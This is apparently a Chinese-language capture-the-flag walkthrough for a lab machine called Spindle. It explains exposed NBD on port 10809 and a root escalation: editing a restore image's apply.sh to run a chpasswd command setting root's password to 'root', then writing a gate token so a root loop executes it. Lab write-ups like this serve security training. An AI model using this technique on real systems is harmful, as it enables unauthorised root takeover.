开放了 22 和 10809 两个端口。

NBD（Network Block Device，网络块设备）。10809 是 NBD 默认 TCP 端口。

NBD 是网络块设备协议，可通过 TCP 把远端镜像 / 磁盘映射为本地裸块设备。

裸块设备 = 磁盘本身的原始二进制，没有文件夹、文件的概念。

拿到一个裸块设备，第一步先查看分区表。

  • 有分区：会出现 /dev/nbd0p1、/dev/nbd0p2
  • 无分区：整个 nbd0 直接是一个文件系统（单分区镜像）

提权（root flag）

先修改 restore 块中的 apply.sh 的内容：

1
2
3
4
5
6
7

┌──(root㉿kali)-[~/MazeSec/Spindle]
└─# vim /mnt/nbd1/apply.sh 
      
┌──(root㉿kali)-[~/MazeSec/Spindle]
└─# cat /mnt/nbd1/apply.sh        
#!/bin/sh
echo "root:root"|chpasswd

chpasswd：Linux 工具，从标准输入批量修改用户密码。标准输入格式 <username>:<pass>。

也就是说这里会把 root 的密码修改成 root。

然后把 gate token 写入 .spindle-go。

1
2
3

ops@Spindle:~$ echo "3070fec846843e66bd78733e6eb63b56" > .spindle-go
ops@Spindle:~$ cat .spindle-go 
3070fec846843e66bd78733e6eb63b56

然后取消挂载，等待一会就可以使用 root:root SSH登录 root 账户了。

一定要先取消对 restore 块的挂载。

因为在 Kali 这边挂载着 /mnt/nbd1 的时候，修改的只是 Kali 本地的页面缓存，没有真正写到远端的 restore NBD 块里 。

umount 之后，Kali 才会把修改刷入远端 NBD 卷，靶机的 keeper 读取到新的 apply.sh。

root@Spindle:~# cat /usr/local/sbin/spindle-restore
#!/bin/sh
mkdir -p /mnt/spindle-restore
while true; do
    GATE=$(cat /etc/spindle/gate 2>/dev/null)
    if [ -n "$GATE" ] && [ "$(cat /home/ops/.spindle-go 2>/dev/null)" = "$GATE" ]; then
        if mount -o loop,ro /srv/restore.img /mnt/spindle-restore 2>/dev/null; then
            [ -x /mnt/spindle-restore/apply.sh ] && timeout -s KILL 20 /mnt/spindle-restore/apply.sh
            umount /mnt/spindle-restore 2>/dev/null
        fi
    fi
    sleep 15
done

while true; do ... sleep 15; done 死循环，每 15 秒跑一轮。
